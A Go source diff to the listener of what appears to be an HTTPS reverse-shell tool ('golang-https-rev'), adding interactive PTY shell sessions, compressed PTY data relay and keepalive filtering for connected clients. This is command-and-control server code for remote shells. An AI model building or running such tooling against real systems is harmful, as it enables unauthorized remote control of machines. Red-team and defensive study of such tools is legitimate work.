@@ -12,6 +12,7 @@ import (
 	"sync"
 	"time"
 
+	"golang-https-rev/pkg/compression"
 	"golang-https-rev/pkg/protocol"
 )
 
@@ -24,6 +25,8 @@ type Listener struct {
 	clientConnections map[string]chan string
 	clientResponses   map[string]chan string
 	clientPausePing   map[string]chan bool
+	clientPtyMode     map[string]bool      // Track if client is in PTY mode
+	clientPtyData     map[string]chan []byte // PTY data channels
 	mutex             sync.Mutex
 }
 
@@ -37,6 +40,8 @@ func NewListener(port, networkInterface string, tlsConfig *tls.Config) *Listener
 		clientConnections: make(map[string]chan string),
 		clientResponses:   make(map[string]chan string),
 		clientPausePing:   make(map[string]chan bool),
+		clientPtyMode:     make(map[string]bool),
+		clientPtyData:     make(map[string]chan []byte),
 	}
 }
 
@@ -70,7 +75,7 @@ func (l *Listener) acceptConnections(listener net.Listener) {
 // handleClient handles a single client connection
 func (l *Listener) handleClient(conn net.Conn) {
 	clientAddr := conn.RemoteAddr().String()
-	log.Printf("[+] New client connected: %s", clientAddr)
+	log.Printf("\n[+] New client connected: %s", clientAddr)
 	defer conn.Close()
 
 	cmdChan := make(chan string, 10)
@@ -88,10 +93,14 @@ func (l *Listener) handleClient(conn net.Conn) {
 		delete(l.clientConnections, clientAddr)
 		delete(l.clientResponses, clientAddr)
 		delete(l.clientPausePing, clientAddr)
+		if ptyDataChan, exists := l.clientPtyData[clientAddr]; exists {
+			close(ptyDataChan)
+			delete(l.clientPtyData, clientAddr)
+		}
+		delete(l.clientPtyMode, clientAddr)
 		l.mutex.Unlock()
 		close(cmdChan)
 		close(respChan)
-		close(pausePing)
 		log.Printf("[-] Client disconnected: %s", clientAddr)
 	}()
 
@@ -125,6 +134,42 @@ func (l *Listener) handleClient(conn net.Conn) {
 				}
 				readerFailed <- true
 				return
+			}
+
+			// Check for PTY data
+			currentLine := responseBuffer.String()
+			if strings.HasPrefix(currentLine, protocol.CmdPtyData+" ") {
+				encoded := strings.TrimPrefix(currentLine, protocol.CmdPtyData+" ")
+				encoded = strings.TrimSuffix(encoded, "\n")
+				
+				// Decompress hex PTY data
+				data, err := compression.DecompressHex(encoded)
+				if err != nil {
+					log.Printf("Error decompressing PTY data from %s: %v", clientAddr, err)
+					responseBuffer.Reset()
+					continue
+				}
+				
+				l.mutex.Lock()
+				ptyDataChan, exists := l.clientPtyData[clientAddr]
+				l.mutex.Unlock()
+				
+				if exists {
+					select {
+					case ptyDataChan <- data:
+					default:
+						log.Printf("Warning: PTY data channel full for client %s", clientAddr)
+					}
+				}
+				responseBuffer.Reset()
+				continue
+			}
+
+			// Check for PTY exit
+			if strings.HasPrefix(currentLine, protocol.CmdPtyExit) {
+				l.ExitPtyMode(clientAddr)
+				responseBuffer.Reset()
+				continue
 			}
 
 			// Check if we've reached the end of output marker anywhere in the buffer
@@ -201,6 +246,11 @@ func (l *Listener) SendCommand(clientAddr, cmd string) error {
 
 	// Pause PING to avoid interference with command response
 	if pauseExists {
+		// Ensure the pause signal is delivered even if a previous value is buffered
+		select {
+		case <-pauseChan:
+		default:
+		}
 		select {
 		case pauseChan <- true:
 		default:
@@ -231,17 +281,57 @@ func (l *Listener) GetResponse(clientAddr string, timeout time.Duration) (string
 	defer func() {
 		if pauseExists {
 			select {
+			case <-pauseChan:
+			default:
+			}
+			select {
 			case pauseChan <- false:
 			default:
 			}
 		}
 	}()
 
-	select {
-	case resp := <-respChan:
-		return resp, nil
-	case <-time.After(timeout):
-		return "", fmt.Errorf("timeout waiting for response")
+	deadline := time.Now().Add(timeout)
+
+	cleanResp := func(resp string) string {
+		r := strings.ReplaceAll(resp, "\r", "")
+		r = strings.ReplaceAll(r, protocol.EndOfOutputMarker, "")
+		return strings.TrimSpace(r)
+	}
+
+	// Drop any stale keepalive responses before waiting for the real reply
+	for {
+		select {
+		case resp := <-respChan:
+			clean := cleanResp(resp)
+			if clean == protocol.CmdPong || clean == protocol.CmdPing {
+				continue
+			}
+			// Found a real response buffered from earlier
+			return resp, nil
+		default:
+			goto waitForFresh
+		}
+	}
+
+waitForFresh:
+
+	for {
+		remaining := time.Until(deadline)
+		if remaining <= 0 {
+			return "", fmt.Errorf("timeout waiting for response")
+		}
+
+		select {
+		case resp := <-respChan:
+			clean := cleanResp(resp)
+			if clean == protocol.CmdPong || clean == protocol.CmdPing {
+				continue
+			}
+			return resp, nil
+		case <-time.After(remaining):
+			return "", fmt.Errorf("timeout waiting for response")
+		}
 	}
 }
 
@@ -256,4 +346,57 @@ func (l *Listener) GetClientAddressesSorted() []string {
 	}
 	// In a real implementation, you'd sort these
 	return clients
+}
+
+// EnterPtyMode puts a client into PTY mode for interactive shell
+func (l *Listener) EnterPtyMode(clientAddr string) (chan []byte, error) {
+	l.mutex.Lock()
+	defer l.mutex.Unlock()
+
+	if _, exists := l.clientConnections[clientAddr]; !exists {
+		return nil, fmt.Errorf("client %s not found", clientAddr)
+	}
+
+	if l.clientPtyMode[clientAddr] {
+		return nil, fmt.Errorf("client %s already in PTY mode", clientAddr)
+	}
+
+	ptyDataChan := make(chan []byte, 100)
+	l.clientPtyData[clientAddr] = ptyDataChan
+	l.clientPtyMode[clientAddr] = true
+
+	return ptyDataChan, nil
+}
+
+// ExitPtyMode exits PTY mode for a client
+func (l *Listener) ExitPtyMode(clientAddr string) error {
+	l.mutex.Lock()
+	defer l.mutex.Unlock()
+
+	if !l.clientPtyMode[clientAddr] {
+		return nil
+	}
+
+	if ptyDataChan, exists := l.clientPtyData[clientAddr]; exists {
+		close(ptyDataChan)
+		delete(l.clientPtyData, clientAddr)
+	}
+
+	l.clientPtyMode[clientAddr] = false
+	return nil
+}
+
+// IsInPtyMode checks if a client is in PTY mode
+func (l *Listener) IsInPtyMode(clientAddr string) bool {
+	l.mutex.Lock()
+	defer l.mutex.Unlock()
+	return l.clientPtyMode[clientAddr]
+}
+
+// GetPtyDataChan returns the PTY data channel for a client
+func (l *Listener) GetPtyDataChan(clientAddr string) (chan []byte, bool) {
+	l.mutex.Lock()
+	defer l.mutex.Unlock()
+	ch, exists := l.clientPtyData[clientAddr]
+	return ch, exists
 }
